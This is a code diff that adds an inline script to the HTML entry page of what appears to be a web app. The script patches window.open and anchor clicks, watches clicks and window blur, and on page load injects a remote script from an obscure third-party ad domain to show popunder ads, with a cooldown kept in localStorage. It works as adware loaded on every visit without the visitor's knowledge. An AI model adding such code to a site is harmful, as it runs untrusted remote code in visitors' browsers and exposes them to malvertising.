@@ -281,5 +281,143 @@
   <body class="bg-[#090706] text-[#FAFAFA] antialiased selection:bg-[#EF4444]/30 selection:text-white">
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
+    <script>
+      (function () {
+        if (typeof window === 'undefined' || typeof document === 'undefined') return;
+        var COOLDOWN_MS = 60000;
+        var STORAGE_KEY = 'kd_popunder_last_shown_at';
+        var POPUNDER_SRC =
+          '\/\/crookedagreement.com\/ctD.9j6QbZ2\/5Dl\/S\/WkQo9uNTz-Y\/2cMCTaYu2ZMoSm0q3GNQj\/YAxwNNjNYx1m';
+        var memoryLastAt = 0;
+        var scriptInjected = false;
+        var lastClickAt = 0;
+        var anchorScriptRef =
+          document.currentScript || document.scripts[document.scripts.length - 1];
+
+        function readLastAt() {
+          try {
+            var raw = window.localStorage.getItem(STORAGE_KEY);
+            var parsed = raw ? Number(raw) : 0;
+            if (Number.isFinite(parsed) && parsed > memoryLastAt) {
+              memoryLastAt = parsed;
+            }
+          } catch (e) {}
+          return memoryLastAt;
+        }
+
+        function writeLastAt(ts) {
+          memoryLastAt = ts;
+          try {
+            window.localStorage.setItem(STORAGE_KEY, String(ts));
+          } catch (e) {}
+        }
+
+        function canTriggerPopunder(now) {
+          return now - readLastAt() >= COOLDOWN_MS;
+        }
+
+        function isWhitelistedTarget(rawUrl) {
+          if (window.__kdAllowAppPopup === true) return true;
+          var url = typeof rawUrl === 'string' ? rawUrl.trim() : '';
+          if (!url || url === 'about:blank') return false;
+          if (/^https?:\/\/accounts\.google\.com\//i.test(url)) return true;
+          if (/^https?:\/\/uplcm\.com\//i.test(url)) return true;
+          if (url.charAt(0) === '/' && url.charAt(1) !== '/') return true;
+          try {
+            var parsed = new URL(url, window.location.origin);
+            if (parsed.origin === window.location.origin) return true;
+          } catch (e) {}
+          return false;
+        }
+
+        if (!window.__kdPopunderGuardInstalled) {
+          window.__kdPopunderGuardInstalled = true;
+
+          var origWindowOpen = window.open;
+          if (typeof origWindowOpen === 'function') {
+            window.open = function (url) {
+              if (isWhitelistedTarget(url)) {
+                return origWindowOpen.apply(window, arguments);
+              }
+              var now = Date.now();
+              if (!canTriggerPopunder(now)) {
+                return null;
+              }
+              writeLastAt(now);
+              return origWindowOpen.apply(window, arguments);
+            };
+          }
+
+          var origAnchorClick = HTMLAnchorElement.prototype.click;
+          if (typeof origAnchorClick === 'function') {
+            HTMLAnchorElement.prototype.click = function () {
+              var target = (this.getAttribute('target') || '').toLowerCase();
+              var href = this.getAttribute('href') || '';
+              if (target === '_blank' && !isWhitelistedTarget(href)) {
+                var now = Date.now();
+                if (!canTriggerPopunder(now)) {
+                  return;
+                }
+                writeLastAt(now);
+              }
+              return origAnchorClick.apply(this, arguments);
+            };
+          }
+
+          document.addEventListener(
+            'pointerdown',
+            function () {
+              if (window.__kdAllowAppPopup !== true) {
+                lastClickAt = Date.now();
+              }
+            },
+            true
+          );
+
+          window.addEventListener('blur', function () {
+            if (
+              scriptInjected &&
+              window.__kdAllowAppPopup !== true &&
+              Date.now() - lastClickAt <= 800
+            ) {
+              var now = Date.now();
+              if (canTriggerPopunder(now)) {
+                writeLastAt(now);
+              }
+            }
+          });
+        }
+
+        function loadPopunderScript(xdb) {
+          if (scriptInjected) return;
+          var now = Date.now();
+          var elapsed = now - readLastAt();
+          if (elapsed < COOLDOWN_MS) {
+            window.setTimeout(function () {
+              loadPopunderScript(xdb);
+            }, COOLDOWN_MS - elapsed + 100);
+            return;
+          }
+          scriptInjected = true;
+          var d = document;
+          var s = d.createElement('script');
+          var l =
+            anchorScriptRef && anchorScriptRef.parentNode
+              ? anchorScriptRef
+              : d.currentScript || d.scripts[d.scripts.length - 1];
+          s.settings = xdb || {};
+          s.src = POPUNDER_SRC;
+          s.async = true;
+          s.referrerPolicy = 'no-referrer-when-downgrade';
+          if (l && l.parentNode) {
+            l.parentNode.insertBefore(s, l);
+          } else {
+            (d.head || d.body || d.documentElement).appendChild(s);
+          }
+        }
+
+        loadPopunderScript({});
+      })();
+    </script>
   </body>
 </html>
